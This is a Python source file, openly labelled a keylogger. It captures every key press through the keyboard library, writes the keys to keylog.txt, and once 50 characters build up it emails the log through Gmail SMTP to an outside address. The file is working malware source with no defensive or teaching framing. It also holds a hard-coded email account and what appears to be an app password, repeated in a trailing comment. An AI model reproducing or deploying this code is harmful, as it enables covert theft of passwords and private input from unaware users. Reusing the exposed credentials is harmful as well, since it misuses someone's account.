# Keylogger
import keyboard
import os
import smtplib
def sendEmail():

    # Open a plain text file for reading.  For this example, assume that
    # the text file contains only ASCII characters.
    with open("./keylog.txt", 'r') as fp:
        # Create a text/plain message
        msg = fp.read()

    # me == the sender's email address
    # you == the recipient's email address
    From = "key.log12321@gmail.com"
    To = "gurtarandhillon@yahoo.com"

    # Send the message via our own SMTP server, but don't include the
    # envelope header.
    s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    s.login("key.log12321@gmail.com", "rbwo becq iref zjio")
    s.sendmail(From, To, msg)
    s.quit()
Running = True
while Running == True:
    log = keyboard.read_event()
    if log.event_type == keyboard.KEY_DOWN:  
        key = log.name
# making it look neat
        if key == "space":
            key = " " 
        if key == "backspace":
            key = "[backspace] "
        if key == "shift":
            key = "[shift] "
        if key == "alt":
            key = "[alt] "
        if key == "ctrl":
            key = "[ctrl] "
        if key == "tab":
            key = "[tab] "
        if key == "esc":
            key = "[esc] "
        if key == "caps lock":
            key = "[CAPSLK] "
        if key == "enter":
            key = "\n"

# printing on keylog.txt
        with open("keylog.txt", "a") as file: 
            file.write(key)
# end   
        if keyboard.is_pressed('esc'):
            print("Program end")
            os.startfile('keylog.txt')
            Running = False
        with open("keylog.txt", "r") as file:
            if len(file.read()) >= 50:
                sendEmail()
                # with open("keylog.txt", "w") as file: 
                #     file.write("")

# rbwo becq iref zjio
